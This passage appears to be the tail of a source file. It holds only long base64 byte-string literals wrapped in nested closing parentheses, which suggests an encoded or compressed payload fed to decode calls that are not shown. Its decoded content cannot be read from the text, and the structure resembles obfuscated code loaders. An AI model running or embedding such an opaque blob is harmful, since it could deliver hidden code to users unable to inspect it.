        b'qVCVS9cDN4cQ7ZRi3gFv6qNlp4PBsesCApell4kOHmG/pLiBH6md4ZVsOY6ZLF8OVgZwHicl50N8kjf51GQByZ8FHWMxl+ONeSyxyIv5lWxx7DCrWqXC+a5gZjMMe7Hk'
        b'EUJpPSsBVlpe5DPWDKkT/qnAMimB0MXFmV7YjPXcLydY8ArnHKPp9DP3GNkAkhLFMGen6uXHkmEVG1nTL6ewhuv+Og7kYIU3vXMG79oKsMYLCrjGpKDHjXepEecUMKca'
        b'cRQ1xl4ytidEU2HMOirADj8B9my142Z5INAdK3xkBMJsv6OsRNd4Bl/DrBoaT/B+uGkoZo44KLxmLORecZfHWi9PaioIlkwFWBoTyi1lPFTslnjicOwCc8QxfGssdOXK'
        b'/nD32N41ZNH2LLteqNmtxH0CYzH3dd92seAtbe7rhDtXLvN5gpZOiAQjlkrclx9GGwh8jUW+1BR36y3ulW8Hi9JGqbGq8XPXG874bXHSKoq5+ra2VWhChLf8K7pWb/zl'
        b'ndwSrfraHvtgu1SFU3277F3+WO+y+DD7G6rv/tcHH2VFhW/b8c0Pl371VvIH3v/zh5e7Gn7/qD1NSffM6zU9n6nYDAefW3QcfF3uk7bcW+O9/3gQNGpZf6r0eG+0Vnj7'
        b'41cfm374j1/MCH+674Ze82+HE40++3nnxfbYFKVLo5MXVao6Uze1WX/jcvrex8G/VOt6L7Xwu7G2e7Jtx1pKez+x+CDjvZn9p2yHg2Nd3v/Ox2+mfD3nYtPg9HaP/pDG'
        b'sXHf7T4DMx/M7US7l+26/6USGTL3rvLtPn3/35zQcfv1S+dMdv/mrvbxQzn3+x1NLZ1njPRaB7a9qvmXet9tRvsGddz/1v2ZRfGNv70xYf/Dt1/3bXmnVqsv5OzXm/p8'
        b'BiKLs7UjnVV+MV//kiC1L7X6N7qd7yU9NP2F2W+abujJvVHvnfodkxmj4Um3P43/oNjpFx4fXK8f+at/to8wOSXaqy2y2LbE6lsP3rv7zdcf/67m1a/tNPqe6a8Xtuz/'
        b'sfm+ReWOBY/vvg1LQx/47vvEWeHOxcWsg3d0X9F100vzthw4k/jrfzpoyP9J5/L/a+7ag6K6zvh97YPXsgISVEJA6gOWxQA+ELVERAQXUBtfSdXrslzgyrK77AN5SFBQ'
        b'ERQIkmqMYooWGYKg4Fusac/xUSfWpHnVuWONTWYaNR2nGe101CA9372gefhPO52hs7O/vXvOuWf3nsc939n9fr/P8PZnD3blfWiICloy/jWnpfEi15yU9Cj57M4LiRP/'
        b'kM1Zp163m1KuJi/+IDn6K0/nDGHFfTEzp/67t9ZUpJcPJPgmrY9ekmnZ2rH34qw7BxNiIuMX5Nddi/lb6Utfnqsrq7ufd82yyVOx2JhTt2rSzWNhLZ5738Yvv91Rc2LP'
        b'4OF1q6SZX5x9f/evEpf3XppdmLQo8fYbaFXliVlL59RO7axtWfnJhuVJwrsHc3sb/Rr7/trk7DpaZ7RaNP3X8ZNKTpN4YVRjcfWrq9/9y15hXH7/XXyte5PrySX7Hwsf'
        b'X7pVNSAuX/aF7eqyf17+LvjSsaTBh5HJDS94nlyMTG7a7XnSteBJ6PvqT7f0JQ+oPvw8e+u9c1HeMr8rFB+zkQkM86QD7yX3j8Y5r8ikKnK7qnUoTq4ZuOYHJLmUCJnR'
        b'hnfMWfEcRlsCPisHXtDYFIpXi4h7fJx+Xn5kSd/uMfk7Pb5kKT7FUqHlnJYYMptln1r4qcn8tNh6fHJ9sZ+aCkHbZr3Coh4d6/4ZOAyLq1wlvsUefMof1aMd/lo/b3zU'
        b'v0RFReGWCh2HD6fgajdESTQIqXLB3JU/KooahqvO4tTojBWfU/iCv52P+3yGy/TjdnDx72CmjI9QosvtnzvahRq0xX6TyDLT5yILW91zasQn1GQNaDC5QbsOd02DVXRI'
        b'g2VIgWWN8H0NFnQGHflplLiEkfUsHXGICpVvq/8voMT15nmr3ZzL87LP9acEGAPDTKXDQSpkUM340lqGY7W0mlUzakbHBqgCAvRe+jC9JkAd5M0FBjEhGcz4qTRVxSQw'
        b'dKIcHYhjwf82DNIMIXTqBEhj+NlDkYMYS5J8xKwYTglRj31NP5fUzTL6GDgrMnW4bCQTzUSRp4GJojZxXXKamomRU8iDpLWDW7X64bD/t1avpUPo7z+5Qe6hc+1T92bW'
        b'eQcu/pm7d/zID4wRG5C00hiyuzU0EdxhXHDzdPz5OVGv5Ehfm3EHOko2Fk24CWKUoTrUpKFwTZluDPsi/Pcu+v7rMOsaTVOUT2rUtIaM7Asv6+d/sCdwUuv+BQX6lJyA'
        b'8LS40BpVjp326V/R/PrxtbUP+m1/uhF0mfvsy4GPu+yGtvRPXqj8OG3pzaa1Z3aN48umV1QvLWJjQ+fdS0y7ceKBx5rTmIWaM858bWNbx1xpuzKz4Kwqv9F47UVTWOLJ'
        b'M/YxdxvvxO8JGxwYfef8GMddp/X+m4Fzu76N7q04sCDvaspHCcb6je9dubz31+U3Kj4/91FKzHtfFxpau8eaBi/dbC9fl3ejpDXTvqfINm1g5u5w37jq34WETfxH3EVf'
        b'OuVqb83q1G29tdzj9OKN80IjcFx2ePNXQfmJl1Xeq9q2FN64FTxBun1Lt/qBo0kz+0DT779p3xk9mH2df7zorfODzLQNv+yP/ybqJUU87FAq2UgQW3XRIllKQkP5oD4a'
        b'nWfINuM87pXXqUnE2Id4YL1QCtzUR+Fz4LJ7ErVFWBQNK1ybpXQFkP7hZx0NhU7P0AWwYUtRt7wKGnHzBNBGzdJ4zaLUHKMlWw5Z8M46GmTUpqipkjD6VQofnJQvU74s'
        b'qBp1GnDjZGAJ76Cp1egdr1iG7BsO41ZF06k9EvUpCyPeJaooLpsm46EdH5Bz/TyB4FtvHBL2KtLrcD2bPQ+dUaTfOnH3KJle/g7aOMwv3x6ukJSbK1mlWrIqN0RlcFQA'
        b'blF4ZGdRzxKZF69fhU+YFsZkT0ugqUKXBu9k1GRHplDVjqDOQFN8AjnXNKRdFsEGoS2zqtBRmWKesRr3QH5GlpKtwz2sGe+Lq0KHZF5MBDpuwdshEF4TsRc6WIpbQqP+'
        b'6dFKxNy9+JgdOH9ZMTrUR/YAcTQ6/At0QCa46RbSBiNuyFyI6mmKK6LR6WDUIi/9qMW80gDNnAmfmZWRjrtjyIWNq+RIK+9CygodbMqCmDeN0KCkwX2iiowMuegdqMOt'
        b'iBXnr3F9L987A/VEM2RTunWdTNwOnbsE9aFNPrjPH59woTp8yoGPF6Pt/n4kL5LTzMft8sdULY+RyUcGqItMTtIFJ0sZfCBkutxxsWQDsk9Rm8P92qeCc9Xp7mi501Gr'
        b'2oS6J5OeBRkxWUpxUQZqmJJtjFJTZOvcuWC+ZgM6YpKbKxK3BPrgoxPINvM42F/NFD5EmrVTsUhOo31B4DANdHeyjW6jVBto/JvwoaBX+KwTH4RsIyhzFxujEZwK9tdY'
        b'D4e24rYquZYpBQGk0eshYEYmQ6FtYV4TGTIVtqFqRUGhJtRkWGiMyTLG0pTv6Nw81juYWFAwabJMJhPpFFMsxCHCTeTrByaweegI3g+KbvLMI/aL3pAeEw3sTugS/Cb5'
        b'/u0M/O+AtiniAc0JkQayOSO7r/20icJv23DPcJCiySN/Y/8fLQ/BI2CRPAsOXEJAq/Meol6CZpp+6EhRN/OVFdGGjga5jaCcxgxCKGAtbWP/c+rY8IN7WSFRyeZCtMRa'
        b'BZvTRdYzSeX2OKyCxFlFl1vickULQbtDsEmsy+2UVDllbsElcTl2u1ViRZtbUuUR04q8OM22fEFSiTaHxy2xlgKnxNqduZI6T7S6BfKmyOyQ2HLRIanMLosoSmyBUEqK'
        b'kOq9RZdoc7nNNosgqR2eHKtokXznKyzGLHMhOdnX4RTcbjGvjC8tskraTLulME0kX9IrJ2G6YAP5KclPdNl5t1gkkIqKHBKXtjg1TfJzmJ0ugSdZwOiWRhXZc2fOUKJ1'
        b'8LlivuiWNGaLRXC4XZKffGG8204sRVu+xK7MypR8XAVinpsXnE67U/Lz2CwFZtEm5PJCqUXy4nmXQJqK5yWdzc7bc/I8LoscZ0nyGn5DLsdjA/2pZ4aY0t6TnevBVNsA'
        b'UAawCWAzQJXMZwMoBygAyAfYCFAkc2MB7ADrAIBI6LQCiAAegAoAMwCQV50OgDcAtgBsBXADAH3YaQOoBCgFKAEoBKiWpewAcuQPAlpdDRzVAhQ/pQvCQPIaNqpef/hT'
        b'o0ou8UibR8aLYCmIlfQ8P3Q8ZJc/Gjv0PtxhthSCBBlwWSFPyM2O0sqkP0nD82arleeVgSvTAr1gxKqVQKnOv0NK3bAN/KNgy5J2Nul9j1X4OcR6c0FsU47i1Frmv59C'
        b'QcsYmTP9b+6p7W4='
    ))))
